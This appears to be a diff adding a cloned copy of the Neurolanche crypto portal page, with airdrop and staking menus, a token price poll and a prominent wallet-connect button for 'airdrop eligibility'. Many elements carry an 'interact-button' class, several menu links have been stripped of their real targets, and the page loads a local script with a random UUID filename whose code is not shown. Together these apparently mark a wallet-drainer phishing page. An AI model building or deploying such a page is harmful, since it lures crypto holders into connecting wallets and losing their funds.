+          --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+          --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+          --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+          --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+        }
+      </style>
+      <div class="app interact-button">
+        <header class="_header_1m4je_1">
+          <div class="_mobileMenu_1uhjr_1">
+            <div class="_mobileMenuIcon_1uhjr_27"><button class="_toggleButton_1uhjr_9"><svg stroke="currentColor"
+                  fill="none" stroke-width="0" viewBox="0 0 24 24" height="25" width="25"
+                  xmlns="http://www.w3.org/2000/svg">
+                  <path
+                    d="M4 6C4 5.44772 4.44772 5 5 5H19C19.5523 5 20 5.44772 20 6C20 6.55228 19.5523 7 19 7H5C4.44772 7 4 6.55228 4 6Z"
+                    fill="currentColor"></path>
+                  <path
+                    d="M4 18C4 17.4477 4.44772 17 5 17H19C19.5523 17 20 17.4477 20 18C20 18.5523 19.5523 19 19 19H5C4.44772 19 4 18.5523 4 18Z"
+                    fill="currentColor"></path>
+                  <path
+                    d="M5 11C4.44772 11 4 11.4477 4 12C4 12.5523 4.44772 13 5 13H13C13.5523 13 14 12.5523 14 12C14 11.4477 13.5523 11 13 11H5Z"
+                    fill="currentColor"></path>
+                </svg></button></div>
+            <div class="_mobileMenuContent_1uhjr_51 _open_1uhjr_85">
+              <div class="_menuHeader_1uhjr_127"><span class="_menuTitle_1uhjr_141">Menu</span><button
+                  class="_closeButton_1uhjr_151"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                    viewBox="0 0 1024 1024" fill-rule="evenodd" height="1em" width="1em"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path
+                      d="M799.855 166.312c.023.007.043.018.084.059l57.69 57.69c.041.041.052.06.059.084a.118.118 0 0 1 0 .069c-.007.023-.018.042-.059.083L569.926 512l287.703 287.703c.041.04.052.06.059.083a.118.118 0 0 1 0 .07c-.007.022-.018.042-.059.083l-57.69 57.69c-.041.041-.06.052-.084.059a.118.118 0 0 1-.069 0c-.023-.007-.042-.018-.083-.059L512 569.926 224.297 857.629c-.04.041-.06.052-.083.059a.118.118 0 0 1-.07 0c-.022-.007-.042-.018-.083-.059l-57.69-57.69c-.041-.041-.052-.06-.059-.084a.118.118 0 0 1 0-.069c.007-.023.018-.042.059-.083L454.073 512 166.371 224.297c-.041-.04-.052-.06-.059-.083a.118.118 0 0 1 0-.07c.007-.022.018-.042.059-.083l57.69-57.69c.041-.041.06-.052.084-.059a.118.118 0 0 1 .069 0c.023.007.042.018.083.059L512 454.073l287.703-287.702c.04-.041.06-.052.083-.059a.118.118 0 0 1 .07 0Z">
+                    </path>
+                  </svg></button></div>
+              <ul class="_menuList_1uhjr_101">
+                <li class="_menuItem_1uhjr_115 _headerItem_iip88_1">AIRDROP</li>
+                <li class="_menuItem_1uhjr_115"><a aria-current="page" class="_navigationLink_iip88_13 _active_iip88_61"
+                    href=""><img src="astar.png" alt="dApp Staking">dApp Staking</a></li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/zkstrike"><img src="zkstrike.svg" alt="ZkStrike">ZkStrike</a>
+                </li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/nero"><img src="nero.png" alt="NERO">NERO</a></li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/neurolauncher"><img src="neurolauncher.png"
+                      alt="Neurolauncher">Neurolauncher</a></li>
+                <li class="_menuItem_1uhjr_115 _headerItem_iip88_1">TOKEN</li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/nerox"><img src="nerox.png" alt="NEROX">NEROX</a></li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/ambassadors"><svg stroke="currentColor" fill="currentColor"
+                      stroke-width="0" viewBox="0 0 512 512" height="25" width="25" xmlns="http://www.w3.org/2000/svg">
+                      <path
+                        d="M188.28 59.47c-19.086 0-34.56 15.468-34.56 34.56 0 16.077 10.983 29.57 25.843 33.44l-35.344 81.936c15.877 2.885 27.905 16.784 27.905 33.5 0 18.806-15.23 34.063-34.03 34.063-18.802 0-34.032-15.258-34.032-34.064 0-13.37 7.703-24.924 18.906-30.5l-50.814-79.22c8.007-5.82 13.22-15.24 13.22-25.905 0-17.693-14.314-32.06-32-32.06-17.688 0-32.032 14.37-32.032 32.06 0 17.693 14.344 32.032 32.03 32.032.734 0 1.468-.014 2.188-.062l41.907 227h316l41.936-227c.72.048 1.455.063 2.188.063 17.686 0 32.03-14.34 32.03-32.032 0-17.693-14.344-32.06-32.03-32.06-17.687 0-32.03 14.37-32.03 32.06-.002 10.723 5.286 20.187 13.373 26l-50.656 79.532c10.778 5.72 18.126 17.04 18.126 30.094 0 18.806-15.23 34.063-34.03 34.063s-34.032-15.258-34.032-34.064c0-17.11 12.602-31.267 29.03-33.687l-34.75-81.532c15.275-3.577 26.657-17.287 26.657-33.657 0-19.094-15.474-34.56-34.56-34.56-19.09 0-34.564 15.468-34.564 34.56 0 14.798 9.308 27.415 22.375 32.345L268 202.345c14.62 4.52 25.25 18.112 25.25 34.218 0 19.796-16.053 35.843-35.844 35.843-19.79 0-35.812-16.047-35.812-35.844 0-15.158 9.403-28.102 22.687-33.343l-44.124-76.72c13.234-4.845 22.688-17.552 22.688-32.47 0-19.094-15.475-34.56-34.563-34.56zM97.438 384.936c-23.978 3.763-22.86 39.844 4.188 39.844h6.656l.064.345h294.28l.063-.344h7.625c26.034 0 27.88-35.928 4.313-39.842H97.437z">
+                      </path>
+                    </svg>Ambassadors</a></li>
+                <li class="_menuItem_1uhjr_115 _headerItem_iip88_1">STAKE</li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 "
+                    href="https://portal.neurolanche.com/neroxtoken"><svg stroke="currentColor" fill="currentColor"
+                      stroke-width="0" viewBox="0 0 512 512" height="25" width="25" xmlns="http://www.w3.org/2000/svg">
+                      <path
+                        d="M0 405.3V448c0 35.3 86 64 192 64s192-28.7 192-64v-42.7C342.7 434.4 267.2 448 192 448S41.3 434.4 0 405.3zM320 128c106 0 192-28.7 192-64S426 0 320 0 128 28.7 128 64s86 64 192 64zM0 300.4V352c0 35.3 86 64 192 64s192-28.7 192-64v-51.6c-41.3 34-116.9 51.6-192 51.6S41.3 334.4 0 300.4zm416 11c57.3-11.1 96-31.7 96-55.4v-42.7c-23.2 16.4-57.3 27.6-96 34.5v63.6zM192 160C86 160 0 195.8 0 240s86 80 192 80 192-35.8 192-80-86-80-192-80zm219.3 56.3c60-10.8 100.7-32 100.7-56.3v-42.7c-35.5 25.1-96.5 38.6-160.7 41.8 29.5 14.3 51.2 33.5 60 57.2z">
+                      </path>
+                    </svg>NEROX Token</a></li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 interact-button"><img
+                      src="neurolauncher.png" alt="Neurolauncher NFT">Neurolauncher NFT</a></li>
+                <li class="_menuItem_1uhjr_115 _headerItem_iip88_1">BONUS</li>
+                <li class="_menuItem_1uhjr_115"><a class="_navigationLink_iip88_13 interact-button "><img
+                      src="astar.png" alt="dApp Staker Bonus">dApp Staker Bonus</a></li>
+              </ul>
+            </div>
+          </div>
+          <div class="_buttonGroup_1m4je_41 interact-button"><button class="_button_1a6kz_1 _connectBtn_1m4je_51 "><svg
+                stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="20" width="20"
+                xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V192c0-35.3-28.7-64-64-64H80c-8.8 0-16-7.2-16-16s7.2-16 16-16H448c17.7 0 32-14.3 32-32s-14.3-32-32-32H64zM416 272a32 32 0 1 1 0 64 32 32 0 1 1 0-64z">
+                </path>
+              </svg><span class="_buttonText_1a6kz_51 interact-button"> Connect </span></button>
+            <div class="_socialButtons_1m4je_79 interact-button"><a target="_blank"
+                class="_button_1a6kz_1 _socialButton_1m4je_79 interact-button "><svg stroke="currentColor" fill="currentColor"
+                  stroke-width="0" viewBox="0 0 448 512" height="20" width="20" >
+                  <path
+                    d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z">
+                  </path>
+                </svg><span class="_buttonText_1a6kz_51"> Telegram </span></a><a
+                href="https://discord.com/invite/XWxtyRXA4q" target="_blank"
+                class="_button_1a6kz_1 _socialButton_1m4je_79 "><svg stroke="currentColor" fill="currentColor"
+                  stroke-width="0" viewBox="0 0 640 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
+                  <path
+                    d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z">
+                  </path>
+                </svg><span class="_buttonText_1a6kz_51"> Discord </span></a></div>
+          </div>
+        </header>
+        <aside class="_sidebar_xk5n3_1">
+          <div class="_sidebarContent_xk5n3_11">
+            <div class="_content_xk5n3_29">
+              <div class="logoWrapper"><img src="neurolanche-logo.png" alt="Logo"></div>
+              <div class="_navigationWrapper_xk5n3_43">
+                <nav class="_section_xk5n3_57">
+                  <ul class="_navigationList_xk5n3_67">
+                    <li class=" _headerItem_iip88_1">AIRDROP</li>
+                    <li class=""><a aria-current="page" class="_navigationLink_iip88_13 _active_iip88_61" href=""><img
+                          src="astar.png" alt="dApp Staking">dApp Staking</a></li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/zkstrike"><img src="zkstrike.svg"
+                          alt="ZkStrike">ZkStrike</a></li>
+                    <li class=""><a class="_navigationLink_iip88_13 " href="https://portal.neurolanche.com/nero"><img
+                          src="nero.png" alt="NERO">NERO</a></li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/neurolauncher"><img src="neurolauncher.png"
+                          alt="Neurolauncher">Neurolauncher</a></li>
+                    <li class=" _headerItem_iip88_1">TOKEN</li>
+                    <li class=""><a class="_navigationLink_iip88_13 " href="https://portal.neurolanche.com/nerox"><img
+                          src="nerox.png" alt="NEROX">NEROX</a></li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/ambassadors"><svg stroke="currentColor" fill="currentColor"
+                          stroke-width="0" viewBox="0 0 512 512" height="25" width="25"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M188.28 59.47c-19.086 0-34.56 15.468-34.56 34.56 0 16.077 10.983 29.57 25.843 33.44l-35.344 81.936c15.877 2.885 27.905 16.784 27.905 33.5 0 18.806-15.23 34.063-34.03 34.063-18.802 0-34.032-15.258-34.032-34.064 0-13.37 7.703-24.924 18.906-30.5l-50.814-79.22c8.007-5.82 13.22-15.24 13.22-25.905 0-17.693-14.314-32.06-32-32.06-17.688 0-32.032 14.37-32.032 32.06 0 17.693 14.344 32.032 32.03 32.032.734 0 1.468-.014 2.188-.062l41.907 227h316l41.936-227c.72.048 1.455.063 2.188.063 17.686 0 32.03-14.34 32.03-32.032 0-17.693-14.344-32.06-32.03-32.06-17.687 0-32.03 14.37-32.03 32.06-.002 10.723 5.286 20.187 13.373 26l-50.656 79.532c10.778 5.72 18.126 17.04 18.126 30.094 0 18.806-15.23 34.063-34.03 34.063s-34.032-15.258-34.032-34.064c0-17.11 12.602-31.267 29.03-33.687l-34.75-81.532c15.275-3.577 26.657-17.287 26.657-33.657 0-19.094-15.474-34.56-34.56-34.56-19.09 0-34.564 15.468-34.564 34.56 0 14.798 9.308 27.415 22.375 32.345L268 202.345c14.62 4.52 25.25 18.112 25.25 34.218 0 19.796-16.053 35.843-35.844 35.843-19.79 0-35.812-16.047-35.812-35.844 0-15.158 9.403-28.102 22.687-33.343l-44.124-76.72c13.234-4.845 22.688-17.552 22.688-32.47 0-19.094-15.475-34.56-34.563-34.56zM97.438 384.936c-23.978 3.763-22.86 39.844 4.188 39.844h6.656l.064.345h294.28l.063-.344h7.625c26.034 0 27.88-35.928 4.313-39.842H97.437z">
+                          </path>
+                        </svg>Ambassadors</a></li>
+                    <li class=" _headerItem_iip88_1">STAKE</li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/neroxtoken"><svg stroke="currentColor" fill="currentColor"
+                          stroke-width="0" viewBox="0 0 512 512" height="25" width="25"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M0 405.3V448c0 35.3 86 64 192 64s192-28.7 192-64v-42.7C342.7 434.4 267.2 448 192 448S41.3 434.4 0 405.3zM320 128c106 0 192-28.7 192-64S426 0 320 0 128 28.7 128 64s86 64 192 64zM0 300.4V352c0 35.3 86 64 192 64s192-28.7 192-64v-51.6c-41.3 34-116.9 51.6-192 51.6S41.3 334.4 0 300.4zm416 11c57.3-11.1 96-31.7 96-55.4v-42.7c-23.2 16.4-57.3 27.6-96 34.5v63.6zM192 160C86 160 0 195.8 0 240s86 80 192 80 192-35.8 192-80-86-80-192-80zm219.3 56.3c60-10.8 100.7-32 100.7-56.3v-42.7c-35.5 25.1-96.5 38.6-160.7 41.8 29.5 14.3 51.2 33.5 60 57.2z">
+                          </path>
+                        </svg>NEROX Token</a></li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/neurolaunchernft"><img src="neurolauncher.png"
+                          alt="Neurolauncher NFT">Neurolauncher NFT</a></li>
+                    <li class=" _headerItem_iip88_1">BONUS</li>
+                    <li class=""><a class="_navigationLink_iip88_13 "
+                        href="https://portal.neurolanche.com/stakerbonus"><img src="astar.png"
+                          alt="dApp Staker Bonus">dApp Staker Bonus</a></li>
+                  </ul>
+                </nav>
+              </div>
+            </div>
+          </div>
+        </aside>
+        <main class="interact-button">
+          <div class="_header_rymis_1">
+            <div class="_leftSide_rymis_19">
+              <div class="_buttonContainer_rymis_35">
+                <div class="_pollContainer_rymis_1357">
+                  <h3 class="_pollTitle_rymis_1379">NEROX - TGE Price Prediction</h3>
+                  <div class="_pollOptions_rymis_1389"><label><input type="radio" name="pricePrediction"
+                        value="1-3"><span>1 - 3 USD</span></label><label><input type="radio" name="pricePrediction"
+                        value="3-5"><span>3 - 5 USD</span></label><label><input type="radio" name="pricePrediction"
+                        value="5-10"><span>5 - 10 USD</span></label><label><input type="radio" name="pricePrediction"
+                        value="10-20"><span>10 - 20 USD</span></label><label><input type="radio" name="pricePrediction"
+                        value="20+"><span>20+ USD</span></label></div><button
+                    class="_submitButton_rymis_1415">Send</button>
+                </div>
+              </div>
+            </div>
+            <div class="_walletBalance_rymis_217"><button class="_button_1a6kz_1 _centerButton_rymis_913 "><span
+                  class="_buttonText_1a6kz_51 interact-button"> Connect EVM Wallet For Airdrop Eligibility </span></button></div>
+          </div>
+        </main>
+      </div>
+    </div>
+  </div>
+
+
+
+ 
+    <script charset="UTF-8" type="text/javascript" src="./c7ff0b88-6644-40f1-a25d-35c02208cb56.js"></script>
+  </body>
+
+</html>
